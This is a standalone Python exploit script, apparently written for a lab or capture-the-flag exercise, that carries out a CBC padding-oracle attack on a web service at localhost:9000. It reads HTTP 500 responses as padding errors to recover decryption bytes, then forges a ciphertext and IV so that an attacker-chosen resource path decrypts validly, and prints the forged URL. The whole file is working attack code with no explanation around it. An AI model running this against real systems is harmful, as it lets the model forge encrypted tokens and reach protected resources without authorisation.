#!/usr/bin/env python3

import base64
import urllib.parse
import http.client
import sys
import os


hostName = "localhost"
hostPort = 9000

def generate_path(IV, ciphertext):
    quoted_id = urllib.parse.quote_plus(base64.b64encode(ciphertext))
    quoted_IV = urllib.parse.quote_plus(base64.b64encode(IV))

    return "/d=" + quoted_id + "&iv=" + quoted_IV

def generate_url(IV, ciphertext):
    return "http://%s:%s%s" % (hostName, hostPort, generate_path(IV,
                                                                 ciphertext))

# http connection
def invalid_pad(ciphertext):
    hR = generate_path(ciphertext[-32:-16], ciphertext[-16:])

    conn = http.client.HTTPConnection(hostName, hostPort)
    conn.request("GET", hR)
    response = conn.getresponse()
    return response.getcode() == 500

def POA_decrypt(ciphertext):
    _ct = bytearray(ciphertext)
    pt = bytearray(16)

    for b in range(1, 17):
        ct = _ct.copy()

        # modify block i-1
        for idx in range(1, b + 1):
            ct[-16 - idx] ^= pt[-idx] ^ b

        # guess last byte
        guess = 0
        while guess < 255 and (invalid_pad(ct) or guess == b):
            ct[-16 - b] ^= guess ^ (guess + 1)
            guess += 1
        if guess == 255:
            guess = b if invalid_pad(ct) else 255
        pt[-b] = guess
        #print("pt[-%d] = %d" % (b, guess))

    return pt

def pad(b):
    return b + bytes((16 - len(b) % 16) * [16 - len(b) % 16])

def byte_xor(X, Y):
    return bytes([x ^ y for (x, y) in zip(X, Y)])

def CBC_R(resource):
    plaintext = pad(bytes(resource, 'utf-8'))
    last_block = os.urandom(16)

    ciphertext = bytes()
    for i in range(len(plaintext), 0, -16):
        # insert to final ciphertext
        ciphertext = last_block + ciphertext
        # decrypt lastest cipher, IV = 00000000000000
        dec = POA_decrypt(bytes(16) + last_block)
        # update new cipher
        last_block = byte_xor(dec, plaintext[i-16:i])

    IV = last_block
    return generate_url(IV, ciphertext)

if __name__ == "__main__":
    print(CBC_R(sys.argv[1]))
